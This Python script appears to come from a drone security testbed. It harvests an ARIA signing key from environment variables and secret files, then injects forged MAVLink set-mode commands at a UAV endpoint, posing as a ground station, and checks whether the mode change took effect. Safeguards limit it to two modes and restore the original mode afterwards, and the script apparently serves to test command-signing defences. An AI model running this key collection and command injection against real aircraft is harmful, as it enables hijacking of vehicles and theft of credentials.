#!/usr/bin/env python3
"""v4_forge shared script.

- key_extract (COLLECT): discover ARIA key material from env/file hints.
- forge_aria  (INJECT): attempt mode command on 14555 and judge by readback.
"""

from __future__ import annotations

import json
import os
import sys
import time
from pathlib import Path
from typing import Optional

FLIGHT_SAFE = (4, 5)
DEFAULT_TARGET = "172.30.0.10:14555"
SECRET_NAME = "aria_key"


def parse_args(argv: list[str]) -> tuple[str, Optional[int]]:
    toks: list[str] = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    endpoint = None
    mode = None
    i = 0
    while i < len(toks):
        if toks[i] == "mode" and i + 1 < len(toks):
            try:
                mode = int(toks[i + 1])
            except ValueError:
                mode = None
            i += 2
            continue
        if endpoint is None:
            endpoint = toks[i]
        i += 1
    return endpoint or DEFAULT_TARGET, mode


def conn_str(ep: str) -> str:
    if ep.split(":", 1)[0] in ("tcp", "udp", "udpin", "udpout"):
        s = ep
    else:
        s = "udpout:" + ep
    sch, rest = s.split(":", 1)
    if ":" not in rest:
        rest += ":14555"
    return sch + ":" + rest


def read_mode(m, sysid, timeout_s: float) -> tuple[Optional[int], Optional[int]]:
    end = time.time() + timeout_s
    while time.time() < end:
        msg = m.recv_match(type="HEARTBEAT", blocking=True, timeout=1.0)
        if msg is None:
            continue
        if msg.get_srcComponent() == 1 and (sysid is None or msg.get_srcSystem() == sysid):
            return int(msg.custom_mode), msg.get_srcSystem()
    return None, sysid


def send_mode(m, mode: int) -> None:
    from pymavlink import mavutil

    for _ in range(3):
        m.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_GCS,
            mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            0,
            0,
            0,
        )
        time.sleep(0.05)
    m.mav.command_long_send(
        1,
        1,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE,
        0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode,
        0,
        0,
        0,
        0,
        0,
    )


def read_stdin_secret(name: str = SECRET_NAME) -> str | None:
    try:
        raw = sys.stdin.buffer.read(128 * 1024)
    except Exception:
        return None
    if not raw:
        return None
    text = raw.decode("utf-8", errors="ignore")
    for line in text.splitlines():
        if "=" not in line:
            continue
        k, v = line.split("=", 1)
        if k.strip() == name:
            v = v.strip()
            return v or None
    return None


def emit_collect(artifacts: list[str], values: dict[str, str]) -> None:
    print(json.dumps({"artifacts": artifacts, "values": values, "nonce_collision": None}))


def emit_inject(accepted: bool, blocked_by: str | None, mode: Optional[int] = None) -> None:
    out = {
        "accepted": bool(accepted),
        "blocked_by": blocked_by,
        "effect": ({"mode": str(mode)} if (accepted and mode is not None) else {}),
        "signed": None,
    }
    print(json.dumps(out))


def collect_key_extract() -> None:
    # Prefer environment hints from testbed deployment.
    env_candidates = (
        "ARIA_KEY",
        "ARIA_KEY_HEX",
        "UAV_ARIA_KEY",
    )
    for k in env_candidates:
        v = os.environ.get(k)
        if v:
            emit_collect(["aria_key"], {"aria_key": v, "source": f"env:{k}"})
            return

    # Fallback file hints.
    file_candidates = (
        Path("/run/secrets/aria_key"),
        Path("/etc/dah/aria_key"),
        Path("/tmp/aria_key"),
    )
    for p in file_candidates:
        try:
            if p.exists() and p.is_file():
                v = p.read_text(encoding="utf-8", errors="ignore").strip()
                if v:
                    emit_collect(["aria_key"], {"aria_key": v, "source": str(p)})
                    return
        except OSError:
            continue

    emit_collect([], {})


def inject_forge_aria(endpoint: str, mode: Optional[int]) -> None:
    key = read_stdin_secret()
    if not key:
        emit_inject(False, "no_effect")
        return
    # Keep key consumed but never log/emit it directly here.
    _ = key

    if mode is None or mode not in FLIGHT_SAFE:
        emit_inject(False, "no_effect")
        return

    try:
        from pymavlink import mavutil

        m = mavutil.mavlink_connection(conn_str(endpoint), source_system=255, source_component=190)
        baseline = None
        sysid = None
        injected = False
        try:
            baseline, sysid = read_mode(m, None, 6.0)
            if baseline is None:
                emit_inject(False, "signing")
                return
            injected = True
            send_mode(m, mode)
            observed = baseline
            end = time.time() + 6.0
            while time.time() < end:
                cur, sysid = read_mode(m, sysid, 1.5)
                if cur is not None:
                    observed = cur
                    if cur == mode:
                        break
            if observed == mode:
                emit_inject(True, None, mode)
            else:
                emit_inject(False, "signing")
        finally:
            try:
                if injected and baseline in FLIGHT_SAFE and baseline != mode:
                    send_mode(m, baseline)
                    read_mode(m, sysid, 4.0)
            except Exception:
                pass
            try:
                m.close()
            except Exception:
                pass
    except Exception:
        emit_inject(False, "signing")


def main() -> None:
    endpoint, mode = parse_args(sys.argv)
    if mode is None:
        collect_key_extract()
        return
    inject_forge_aria(endpoint, mode)


if __name__ == "__main__":
    main()
